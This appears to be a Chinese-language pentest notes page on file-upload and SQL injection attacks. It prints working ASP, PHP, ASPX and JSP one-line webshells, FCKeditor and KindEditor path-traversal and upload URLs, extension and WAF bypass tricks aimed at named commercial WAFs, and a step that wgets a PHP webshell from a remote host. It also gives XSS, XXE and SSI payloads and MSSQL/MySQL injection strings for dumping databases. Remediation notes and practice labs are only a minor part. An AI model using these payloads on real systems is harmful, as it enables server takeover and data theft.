<p>提交shell.php+空格绕过，不过空格只支持win 系统 *nix 是不支持的[shell.php 和shell.php+空格是2 个不同的文件 未测试</p>
<p>继续上传同名文件可变为shell.php;(1).jpg 也可以新建一个文件夹，只检测了第一级的目录，如果跳到二级目录就不受限制</p>
<p><strong>Version 2.4.1 测试通过</strong></p>
<p>修改CurrentFolder 参数使用 …/…/ 来进入不同的目录</p>
<pre><code>/browser/default/connectors/aspx/connector.aspx?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=../../..%2F&amp;NewFolderName=shell.asp
</code></pre>
<p><strong>根据返回的XML 信息可以查看网站所有的目录</strong></p>
<pre><code>FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=%2F
</code></pre>
<p><strong>也可以直接浏览盘符</strong>：<br>
<strong>JSP 版本</strong>：</p>
<pre><code>FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&amp;Type=&amp;CurrentFolder=%2F
</code></pre>
<p><strong>Fckeditor 2.0 &lt;= 2.2</strong></p>
<p>允许上传asa、cer、php2、php4、inc、pwml、pht 后缀的文件上传后它保存的文件直接用的<code>$sFilePath = $sServerDir . $sFileName</code>，而没有使用<code>$sExtension</code>为后缀.直接导致在windows下在上传文件后面加个.来突破（这里点点很重要）</p>
<p>而在apache 下，因为"Apache 文件名解析缺陷漏洞"也可以利用之，另建议其他上传漏洞中定义TYPE 变量时使用File 类别来上传文件,根据FCKeditor 的代码，其限制最为狭隘</p>
<p>在上传时遇见可直接上传脚本文件固然很好，但有些版本可能无法直接上传可以利用在文件名后面加.点或空格绕过，也可以利用iis6 解析漏洞建立xxx.asp文件夹或者上传<code>xx.asp;.jpg</code></p>
<p>参考文章：</p>
<pre><code>https://www.cnblogs.com/zpchcbd/p/11745119.html
</code></pre>
<hr>
<h2><a id="KindEditor_3191"></a>KindEditor</h2>
<p><strong>上传页面</strong></p>
<pre><code>kindeditor/asp/upload_json.asp?dir=file
 
kindeditor/asp.net/upload_json.ashx?dir=file
 
kindeditor/jsp/upload_json.jsp?dir=file
 
kindeditor/php/upload_json.php?dir=file
</code></pre>
<p>上传思路<br>
kindeditor&lt;=4.1.5</p>
<pre><code>curl -F"imgFile=@1.html"http://127.0.0.1/test/kindeditor/php/upload_json.php?dir=file
</code></pre>
<p>参考文章：</p>
<pre><code>https://www.sinesafe.com/article/20190510/Kindeditor.html
https://www.freebuf.com/column/202148.html   --上传思路
</code></pre>
<hr>
<h2><a id="2291__3217"></a>2.2.9.1 上传漏洞总结</h2>
<p><strong>上传总结</strong></p>
<h2><a id="_3220"></a>概要说明</h2>
<p>文件上传漏洞可以说是日常渗透测试用得最多的一个漏洞，因为用它获得服务器权限最快最直接</p>
<p><strong>Asp一句话</strong> ：</p>
<pre><code>&lt;%eval request(“kkk”)%&gt; 	kkk 
</code></pre>
<p><strong>Php一句话：</strong></p>
<pre><code>&lt;?php eval($_POST[666]);?&gt; 	666 
</code></pre>
<p><strong>Aspx一句话:</strong></p>
<pre><code>&lt;%@ Page Language="Jscript"%&gt;&lt;%eval(Request.Item["111"],"unsafe");%&gt; 
</code></pre>
<p><strong>Jsp一句话：</strong></p>
<pre><code>&lt;%
if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("\\")+request.getParameter("f"))).write(request.getParameter("t").getBytes());
%&gt;
</code></pre>
<p>参考一句话：</p>
<pre><code>https://my.oschina.net/u/4373914/blog/3467075
</code></pre>
<hr>
<h2><a id="_3258"></a>服务端的上传验证</h2>
<p><strong>1）白名单验证定义允许上传的后缀类型,除此所有后缓都不允许</strong></p>
<p><strong>2）黑名单验证</strong></p>
<p>定义不允许上传的后缀类型，除此之类其他后缀都可以上传</p>
<p>定义不允许上传的后缀：</p>
<pre><code>asp、aspx、asa、cer、cdx、ash 
</code></pre>
<p>【突破方法】</p>
<p>未重命名可以配合解析漏洞(很少)</p>
<p>可以用cer达到绕过效果</p>
<p>如果未用转换函数强制转换后缀为小写(ASP)</p>
<p>特殊后缀达到效果可利用ashx来生成一句话</p>
<p>.htaccess来实现后缀引导。上传jpg可以解析成脚本，具体在内容定义</p>
<p><strong>3）文件头验证</strong><br>
<img src="https://img-blog.csdnimg.cn/20200922230957904.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>4）文件类型验证</strong><br>
例如可以把php的文件类型改成正常的图片类型</p>
<p><strong>5）文件后缀验证</strong></p>
<p>典型的白名单验证，指定上传后缀必须为jpg、JPG、jpeg、JPEG<br>
<img src="https://img-blog.csdnimg.cn/20200922231320358.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
类似图吧…</p>
<p>6）js前端验证</p>
<p>Js在前端定义了允许上传的后缀类型</p>
<p>【突破方法】直接在前端修改或添加后缀，找不到就搜索图片后缀如jpg</p>
<hr>
<h2><a id="_3303"></a>上传绕过姿势</h2>
<p><strong>服务器解析漏洞（IIS5.x-6.x Apache Nginx IIS7.0/7.5）</strong><br>
<strong>1）IIS5.x-6.x解析漏洞</strong></p>
<p>使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。</p>
<p><strong>目录解析(6.0)</strong><br>
形式：www.xxx.com/xx.asp/xx.jpg<br>
原理: 服务器默认会把.asp，.asa目录下的文件都解析成asp文件。</p>
<p><strong>文件解析</strong><br>
形式：www.xxx.com/xx.asp;.jpg<br>
原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。</p>
<p><strong>解析文件类型</strong><br>
IIS6.0 默认的可执行文件除了asp还包含这三种 :<br>
/test.asa<br>
/test.cer<br>
/test.cdx</p>
<p><strong>修复方案</strong></p>
<pre><code>禁止用户控制文件上传目录，新建目录等权限
上传目录与用户新建的目录禁止执行
上传的文件重命名，不保留用户上传文件的后缀
禁止asa、asp、cer、cdx等后缀的文件上传
</code></pre>
<p><strong>2）Apache解析漏洞</strong></p>
<p><strong>漏洞原理</strong>　<br>
Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。</p>
<p><strong>漏洞形式</strong></p>
<pre><code>www.xxxx.xxx.com/test.php.php123
</code></pre>
<p><strong>其余配置问题导致漏洞</strong><br>
（1）如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。<br>
（2）如果在 Apache 的 conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php方式执行</p>
<p>一个文件名为xxxx1.2x.x3的文件(例如: Index.php.fuck)，Apache会从x3的位置往×1的位置开尝试解析，如果x3不属于 Apache能解析的扩展名，那么 Apache会尝试去解析×2的位置，这样一直往前尝试，直到遇到一个能解析的扩展名为止</p>
<pre><code>WampServer2.0AllVersion(WampServer2.0i/Apache2 2.11) 

Wamp Server2.1AllVersion(Wamp Server2.1e-X32/Apache2 2.17) 

Wamp5AllVersion(Wamp5_1.7.4/Apache2 2.6) 

AppServ2.4All Version(AppServ-2.4.9/Apache2.0.59) 

AppServ2.5AllVersion(AppServ-2.5.10/Apache2.2.8) 

AppServ2.6AllVersion(AppServ-2.6.0/Apache 2.2.8)
</code></pre>
<p>以上集成环境都存在扩展名解析顺序漏洞，并且这些环境都存在对ρhp3文件按照php来解析这个小洞。该方法针对黑名单不全时，能够绕过</p>
<p>总结存在该漏洞的 Apache版本：</p>
<pre><code>Apache2.0.x&lt;=2.0.59 

Apache2.2.X&lt;=2.2.17
</code></pre>
<hr>
<p><strong>3）nginx 解析漏洞</strong></p>
<p><strong>漏洞原理</strong></p>
<p>Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nqinx配置文件中通过正则匹配设置SCRIPT_FILENAME，当访问www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi.script_name会被设置为"phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给 PHP CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢？这就要说到fix_pathinfoi这个选项了</p>
<p>如果开启了这个选项，那么就会触发在PHP中的如下逻辑:</p>
<p>PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了</p>
<p><strong>漏洞形式</strong></p>
<pre><code>www.xxxx.com/UploadFiles/image/1.jpg/1.php

www.xxxx.com/UploadFiles/image/1.jpg%o00.php

www.xxxx.com/UploadFIles/image/1.jpg/%20\0.php
</code></pre>
<p><strong>4）IIS7.5 解析漏洞</strong></p>
<p>IS7.0/7.5是对php解析时有一个类似于Nginx的解析漏洞，对任意文件名只要在URL后面追加上字符串<code>"/</code>任意文件名<code>.php"</code>”就会按照php的方式去解析（例如：webshell.jpg/x.php）</p>
<p>IIS7.0(Win2008R1+IIS7.0)</p>
<p>IIS7.5(Win2008R2+IIS7.5)</p>
<p>IlS的解析漏洞不像Apache那么模糊，针对IIS6.0，只要文件名不被重命名基本都能搞定。这里要注意一点，对于"任意文件名/任意文件名<code>.php"</code>这个漏洞其实是出现自php-cgi的漏洞，所以其实跟IIS自身是无关的</p>
<hr>
<h2><a id="aspaspxphpjsp_3404"></a>文件扩展名绕过（asp、aspx、php、jsp）</h2>
<p><strong>1）asp</strong></p>
<p>#IIS 5.0/6.0</p>
<p>#文件解析</p>
<pre><code>.asp;.jpg 

.asp.jpg 

.asp;jpg 
</code></pre>
<p>#目录解析</p>
<pre><code>.asp/1.jpg
</code></pre>
<p>#大小写绕过</p>
<pre><code>asPx
</code></pre>
<p>#截断</p>
<pre><code>1.asp%00.jpg
</code></pre>
<p>#空格绕过</p>
<pre><code>1.asp .jpg

1.asp_.jpg	（_代替空格，只在windows下有效，因为windows系统自动去掉不符合规则符号后面的内容）
</code></pre>
<p>#黑名单绕过（替代asp）：<br>
IIS6.0 默认的可执行文件除了asp还包含这三种：</p>
<pre><code>asa

cer

cdx

ashx

asmx
</code></pre>
<p>#IIS put 上传</p>
<p>#asaspp</p>
<p>#filename换位置放到content-type 的下一行</p>
<p>#+1.asp;+2.jpg</p>
<p>#双文件上传</p>
<p>#RTOL</p>
<hr>
<p><strong>2）aspx</strong><br>
#IIS 5.0/6.0</p>
<p>#文件解析</p>
<pre><code>.aspx;.jpg 

.aspx.jpg 

.aspx;jpg 
</code></pre>
<p>#目录解析</p>
<pre><code>.aspx/1.jpg
</code></pre>
<p>#大小写绕过</p>
<pre><code>asPx
</code></pre>
<p>#截断</p>
<pre><code>1.aspx%00.jpg
</code></pre>
<p>#空格绕过</p>
<pre><code>1.aspx.jpg

1.aspx_.jpg	（_代替空格，只在windows下有效，因为windows系统自动去掉不符合规则符号后面的内容）
</code></pre>
<p>#黑名单绕过（替代asp）：<br>
IIS6.0 默认的可执行文件除了asp还包含这三种：</p>
<pre><code>asa

cer

cdx

ashx		（生成aspx文件，见waf绕过）

asmx

htr

asax
</code></pre>
<p>#IIS put 上传</p>
<p>#asaspp</p>
<p>#filename换位置放到content-type 的下一行</p>
<p>#+1.aspx;+2.jpg</p>
<p>#asaspxpx</p>
<p>#双文件上传</p>
<p>#RTLO</p>
<hr>
<p><strong>3）php</strong><br>
#大小写</p>
<pre><code>pHp
</code></pre>
<p>#黑名单绕过（替代php)：</p>
<pre><code>php1

php2

php3

php4

php5
</code></pre>
<p>#空格绕过（只有在windows下有效，因为windows系统自动去掉不符合规则符号后面的内容）</p>
<pre><code>1.php .

1.php.

1.php. .

1.php .jpg

1.php_.jpg		（_代替空格）

1.php.jpg

1.php jpg

1.php.   .jpg

111.php&amp;amp,#x2e;jpg
</code></pre>
<p>#十六进制绕过	点绕过</p>
<pre><code>1.php&amp;#x2e;jpg
</code></pre>
<p>#解析漏洞</p>
<pre><code>1.jpg/.php	(nginx)

1.php.123	(apache)

1.jpg/php

1.jpg/1.php

1.jpg%00.php
</code></pre>
<p>#截断</p>
<pre><code>1.php%00.jpg
</code></pre>
<p>#利用不符合windows文件命名规则绕过</p>
<pre><code>1.php:1.jpg

1.php::$DATA

1.php::DATA......
</code></pre>
<p>#回车</p>
<pre><code>1.ph回车p
</code></pre>
<p>#上传 .htaccess:（仅在Apache，例如a_php.gif，会被当成php执行)</p>
<p>.htaccess内容</p>
<pre><code>&lt;FilesMatch "_php.gif"&gt; 

  Sethandlerapplication/x-httpd-php

&lt;/FilesMatch&gt;
</code></pre>
<p>#IIS put上传</p>
<p>#文件包含waf（见6、文件包含绕过）</p>
<hr>
<p><strong>4）jsp</strong><br>
#两个jsp包含中间的jpg</p>
<pre><code>.jsp.jpg.jsp
</code></pre>
<p>#黑名单绕过（替代jsp）：</p>
<pre><code>jspa 

]sps 

jspx 

jspf
</code></pre>
<p>#put上传（Apache Tomcat 7.0.0 - 7.0.81）</p>
<pre><code>%20 		Put /test1.jsp%20 HTTP/1.1 

::$DATA 	Put /test2.jsp: : SdatA Http/1.1 

Put /test3. isp/ Http/1.1 

Put/test3.jsp.http:/1.1
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200923111921247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h2><a id="ContentDispositioncontenttype_3656"></a>Content-Disposition、content-type、文件内容检测、双文件</h2>
<p>1）Content-Disposition</p>
<pre><code> 将form-data；  						修改为-form-data 

替换form-data 为* 					即: Content-Disposit 

将form-data；name="file"; 			分号后面 增加或减少一个空格 

将Content-Disposition：form-data 	冒号后面 增加或减少一个空格 

将Content-Disposition 				修改为content-Disposition

filename回车="1.php"					(过阿里云waf) 

filename="1.php回车" 				(过百度云waf) 

filename="1.jpg";filename="1.php"		双参数 

多个Content-Dispostion
</code></pre>
<p>参考链接：https://www.secpulse.com/archives/117827.html</p>
<hr>
<p>2）Content-Type</p>
<p>php: application/octet-stream</p>
<pre><code>将Content-Type修改为image/gif，或者其他允许的类型。 

或者删除整行! 

删除掉ontent-Typ：image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.p 

将 Content-Type 					修改为 content-Type 

将 Content-Type：application/octet-stream 冒号后面 增加一个空格
</code></pre>
<p>3）文件内容<br>
传图马<br>
<img src="https://img-blog.csdnimg.cn/20200923120335561.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
4）双文件</p>
<pre><code>http://www.webshell1414.com/2017/10/16/上传绕过之双文件上传/
</code></pre>
<hr>
<h2><a id="JavaScriptdayuSeventh_day_3707"></a>客户端检测（JavaScript检测）（dayu-Seventh day)</h2>
<p>这类检测，通常是在上传页面里含有专门检测文件上传的JavaScript代码，最常见的就是检测扩展名是否合法，示例代码如下：</p>
<pre><code>function check()
{
  var filename = document.getElementById("file");
  var str = filename.value.split(".");
  var ext = str[str.length-1];
  if(ext=='jpg'||ext=='png'||ext=='jpeg'||ext=='gif')
  {
    return true;
  }
  else
  {
    alert("仅允许上传png/jpeg/gif类型的文件！")
    return false;
  }
  return false;
}
</code></pre>
<p>判断该类检测的方法：选择一个禁止上传类型的文件上传，当点击确定按钮之后，浏览器立即弹窗提示禁止上传，一般就可以断定为客户端JavaScript检测，进一步确定可以通过配置浏览器HTTP代理（没有流量经过代理就可以证明是客户端JavaScript检测）。</p>
<p>绕过方法：</p>
<p>上传页面，审查元素，修改JavaScript检测函数；<br>
将需要上传的恶意代码文件类型改为允许上传的类型，例如将dama.asp改为dama.jpg上传，配置Burp Suite代理进行抓包，然后再将文件名dama.jpg改为dama.asp。<br>
上传webshell.jpg.jsp，可能前端程序检查后缀时，从前面开始检查。</p>
<p>参考文章：</p>
<pre><code>https://masterxsec.github.io/2017/04/26/文件上传总结/
</code></pre>
<hr>
<h2><a id="WAF_3743"></a>WAF绕过（阿里云、安全狗、百度云、云锁）</h2>
<p><strong>1、阿里云WAF绕过</strong></p>
<pre><code>Content-Disposition：form-data；name="upload"； 

filename==="11111 

.php" 



$x=$_get[×];'$X' 

执行xxx.com?x=wget github的php大马地址

</code></pre>
<p>参考链接:</p>
<pre><code>https://www.t00ls.net/articles-51341.html    --信息过于敏感，已被删除
https://www.xj.hk/thread-1786.htm		---需要论坛用户密码可观看
</code></pre>
<hr>
<p><strong>2、安全狗</strong></p>
<p>1）===绕过</p>
<pre><code>Content-Disposition：form-data；name="upload"；filename==="11111.php" 
</code></pre>
<p>2）去除""绕过</p>
<pre><code>Content-Disposition：form-data；name="upload"； filename=11111.php 
</code></pre>
<p>3）少"绕过</p>
<pre><code>Content-Disposition：form-data，name="upload"； filename="11111.php
</code></pre>
<p>参考链接：</p>
<pre><code>https://www.t00ls.net/articles-51253.html   ---已被删除，过于敏感
https://xz.aliyun.com/t/8000    --可复现
</code></pre>
<hr>
<p><strong>3、百度云</strong></p>
<p>百度云绕过就简单的很多很多，在对文件名大小写上面没有检测php是过了的，Php就能过，或者PHP，一句话自己合成图片马用Xise连接即可</p>
<pre><code>Content-Disposition: form-data; name="up_picture"; filename="xss.jpg .Php"
</code></pre>
<p>或者文件名.php回车，这样引号就在另一行，同时上传内容的一句话前面加个中文字符</p>
<pre><code>https://www.cnblogs.com/bmjoker/p/9141322.html
</code></pre>
<hr>
<p><strong>4、云锁</strong></p>
<pre><code>Content-Disposition：form-data；name="up_picture"； filename="yjh.c.php
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200923210024115.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
另外复现参考文章：</p>
<pre><code>https://www.hacking8.com/sectips/bypasswaf.html
</code></pre>
<hr>
<h2><a id="_3827"></a>实战分析</h2>
<p><strong>1、通过上传zip模板后服务器自解压获取webshell</strong></p>
<pre><code>https://4hou.win/wordpress/?cat=2035
</code></pre>
<hr>
<p><strong>2、黑名单绕过之文件名可控</strong><br>
复现：</p>
<pre><code>https://blog.csdn.net/qq_25899635/article/details/90344198
https://www.cnblogs.com/thespace/p/12346021.html
</code></pre>
<hr>
<p>3、高并发绕过上传总结</p>
<p>upload-labs靶场有环境</p>
<pre><code>https://www.cnblogs.com/aq-ry/p/10063913.html   ---安装
</code></pre>
<p>upload-labs包含了大多数文件上传类型，一个包含几乎所有类型上传类型的靶机，值得学习！！</p>
<hr>
<p><strong>4、跨目录上传绕过waf</strong></p>
<p>访问aspx马</p>
<pre><code>https://xz.aliyun.com/t/7860
</code></pre>
<p>或者利用…/跳到上层目录，shell传到上层，执行即可…</p>
<hr>
<h2><a id="uploadlabs_3861"></a>upload-labs过关</h2>
<p>这台靶机很舒服，文件上传的各种骚操作基本都能实现</p>
<pre><code>1、前端 

2、修改content-type为image/gif

3、黑名单：php3,phtml

4、黑名单：上传.htaccess

5、黑名单：大小写phP 

6、黑名单：空格

7、黑名单：点

8、黑名单：::$DATA 

9、黑名单：info.php..			(点+空格+点) 

10、黑名单：双写

11、白名单：get型%00截断 

12、白名单：post型%00截断，url解码

13、上传图片马，配合包含漏洞

14、条件竞争 
</code></pre>
<p>根据14个条件，开始打upload-labs靶机吧…</p>
<hr>
<h2><a id="_3898"></a>造洞</h2>
<p>文件上传漏洞：↓</p>
<pre><code>html文件：造出一个xss漏洞 

swf文件：造出一个xss漏洞 

svg文件：造出一个xss漏洞 

pdf文件：造出一个XSS漏洞和URL跳转漏洞 

exe文件：钓鱼 

mp4，avi文件：ssrf漏洞 

任意后缀文件，只要文件内容为xxe： 

shtm1文件：ssi命令执行 

xlsx：xxe漏洞
</code></pre>
<p>这里举几个例子：</p>
<p><strong>1、svg文件</strong><br>
<strong>1.svg</strong></p>
<pre><code>&lt;svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/&gt;
</code></pre>
<pre><code>https://xz.aliyun.com/t/1126
</code></pre>
<p><strong>2、swf文件</strong></p>
<pre><code>http://127.0.0.1/swfupload.swf?movieName="]%29}catch%28e%29{if%28!window.x%29{windows.....%29//
</code></pre>
<p><strong>3、任意文件后缀，只要内容是xxe内容</strong></p>
<p>XXE代码：</p>
<pre><code>#EXTM3U 

#EXT-X-MEDIA-SEQUENCE: 0 

#EXTINF: 10.0, 

conca：http://vps_ip:VPS_PORT/header.m3u8 

#EXT-X-ENDLIST 
</code></pre>
<p>读取文件payload<br>
<img src="https://img-blog.csdnimg.cn/20200923214146484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>4、shtml文件 ssi命令执行</strong></p>
<pre><code>&lt;! --#ECHO var="SERVER_SOFTWARE"--&gt; 

&lt;! --#echo var="server_name" --&gt;

&lt;! --#echo var="remote_user" --&gt; 
</code></pre>
<p>命令参考链接：</p>
<pre><code>https://www.secpulse.com/archives/66934.html
</code></pre>
<p>5、xlsx文件 XXE</p>
<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM ' http://test.joychou.me:8081/evil.xlsx"&gt;%remote;]&gt;&lt;root/&gt;
</code></pre>
<pre><code>https://www.redhatzone.com/ask/article/1359.html   --另外思路
</code></pre>
<p>Xlsx文件构造：</p>
<pre><code>1、新建一个xlsx文件 

2、修改后缀为.zip，并解压 

3、打开[Content_Types].xm1，在头部加入xxe payload 

4、重新压缩当前文件夹为zip，之后修改后缀为xlsx 

5、在上传点上传改文件，上传后服务器自动打开文件，触发xxe

6、Dnslog平台查看结果
</code></pre>
<hr>
<h2><a id="2210__4000"></a>2.2.10 注入漏洞</h2>
<p>类型：</p>
<pre><code>数据库种类：Access注入，Mysql注入，Mysql注入，Oracle注入

注入点：GET注入，POST注入，Cookie注入 (ua注入) 

注入点类型：数字型注入，字符型注入，搜索型注入

注入种类：联合注入，盲注（布尔，时间，报错）
</code></pre>
<p><strong>Access注入</strong></p>
<pre><code>https://www.jianshu.com/p/ace43a7a331e
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200923222402921.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h2><a id="MSSQL_4019"></a>MSSQL注入</h2>
<p><strong>POC：↓<br>
查询版本</strong></p>
<pre><code>1’ and @@version&gt;0--
</code></pre>
<p><strong>查询权限</strong></p>
<pre><code>1' and user&gt;0--
</code></pre>
<p><strong>数据库</strong></p>
<pre><code>1' and db_name()&gt;0--     6csfx

1' and (SELECT top 1 Name FROM Master.. SysDatabases)&gt;0-- 	master

and 1=(select name from master.dbo.sysdatabases where dbid=1)--	 //暴库名DBID为1，2，3....

and 1=(select name from master.dbo.sysdatabases where dbid=2)--	tempdb

and 1=(select name from master.dbo.sysdatabases where dbid=3)--	model

and 1=(select name from master.dbo.sysdatabases where dbid=4)--	msdb

and 1=(select name from master.dbo.sysdatabases where dbid=5)--	ReporServer
.
.
.
.
.
.
and 1=(select name from master.dbo.sysdatabases where dbid=12)....
.
.
.
</code></pre>
<p>简单的列举，其余就不列举了，按照长度不同可以自行测试，后面会详细介绍</p>
<p>表</p>
<pre><code>1' And (sElect Top 1 name from sysobjects where xtype=0x55)&gt;0-- Users
</code></pre>
<p>列</p>
<pre><code>' SELECT * FROM Users HAVING 1=1-- Users.pkId
</code></pre>
<p>值</p>
<pre><code>' And (sElect Top 1 UserName from Users)&gt;0-- default

' and 1=convert(int,(SELECT TOP 1 User Name FROM Users WHERE ID NOT IN('1')))--
</code></pre>
<hr>
<h2><a id="MYSQL_4088"></a>MYSQL注入</h2>
<pre><code>https://blog.csdn.net/weixin_45728976/article/details/103932264
</code></pre>
<p><strong>Mysql5.0以下</strong></p>
<pre><code>同理Access注入类似
</code></pre>
<p><strong>Mysql5.0以上注入</strong><br>
<strong>order by解释</strong><br>
<img src="https://img-blog.csdnimg.cn/20200923225614205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><strong>union解释</strong><br>
<img src="https://img-blog.csdnimg.cn/20200923225710302.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<hr>
<p>#检测：</p>
<pre><code>http://demo.sqli.com/Less-1/?id=1'

select username, password from security.users where id = '1'  limit o, 1;
</code></pre>
<p>#列数：</p>
<pre><code>http://demo.sqli.com/Less-1/?id=1' order by 3 %23

select username, password from security.users where id = '1'  order by 3 %23 ' limit
</code></pre>
<p>#联合查询</p>
<pre><code>http://demo.sqli.com/Less-1/?id=1' union select 1,2,3 %23
</code></pre>
<p>#爆显位</p>
<pre><code>http://demo.sqli.com/Less-1/?id=-1' union select 1,2,3 %23
</code></pre>
<p>#获取用户名</p>
<pre><code>http://demo.sqli.com/Less-1/?id=-1'  union select 1,user(),3 %23
</code></pre>
<p>#获取数据库名</p>
<pre><code>http://demo.sqli.com/Less-1/?id=-1'  union select 1,database(),3 %23
</code></pre>
<p>#获取表名</p>
<pre><code>http://demo.sqli.com/Less-1/?id=-1'  union select 1,group_concat(table_name),3 form information_schema.tables where table_schema =database()
</code></pre>
<p>#获取列表名</p>
<pre><code>http://demo.sqli.com/Less-1/?id=-1'  union select 1,group_concat(column_name),3 form information_schema.columns where table_name ='users'
</code></pre>
<p>#获取数据</p>
<pre><code>http://demo.sqli.com/Less-1/?id=-1'  union select 1,group_concat(user_name),group_concat(password) from users
</code></pre>
<p>参考：https://www.jianshu.com/p/5e8a65771641</p>
<p><strong>少见的注入点</strong></p>
<p>搜索框注入<br>
<img src="https://img-blog.csdnimg.cn/20200923232012263.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
输入1’，对语法错误进行判断，注入即可</p>
<hr>
<p><strong>其他点注入</strong></p>
<pre><code>Client-IP User-Agent
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200923232441733.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code>https://blog.csdn.net/weixin_45146120/article/details/100588267   --参考文章
</code></pre>
<hr>
<h2><a id="_4178"></a>盲注</h2>
<p>何为盲注？盲注就是在sql注入过程中，sql语句执行的选择后，选择的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注</p>
<p>延时注入是主要针对页面无变化、无法用布尔真假判断、无法报错的情况下的注入技术</p>
<p>报错注入构造payload让信息通过错误提示回显出来</p>
<p><strong>1、布尔盲注</strong></p>
<pre><code>https://www.jianshu.com/p/f0174ea6c69d
</code></pre>
<p><strong>2、时间盲注</strong></p>
<pre><code>https://www.jianshu.com/p/0d607589e3ad
</code></pre>
<p><strong>3、报错注入</strong></p>
<pre><code>https://xz.aliyun.com/t/253
http://aiyuanzhen.com/index.php/archives/34/
https://www.jianshu.com/p/bc35f8dd4f7c  --12种报错注入
</code></pre>
<hr>
<h2><a id="Sqlmap_4205"></a>Sqlmap</h2>
<p><strong>os-shell Mysql</strong><br>
注入点恰巧又是root权限，这时你就可以直接尝试往目标的网站目录里面写webshell，但还是有个前提，secure_file_priv为空</p>
<pre><code>https://xz.aliyun.com/t/7416
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/2020092409171837.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
遇到这种去情况时，如果上传不成功，有三种原因：<br>
1）mysql高版本的安全模式，secure_file_piv的值为null</p>
<pre><code>进入--sql-shell 

show global variables like '%secure%'; 

当secure_file_priv的值为null，表示限制mysqld 不允许导入 | 导出，那就无法写入马
</code></pre>
<p>2）secure_file_priv指定了某个目录才可以上传，根目录不允许上传，那么可以尝试往upload目录</p>
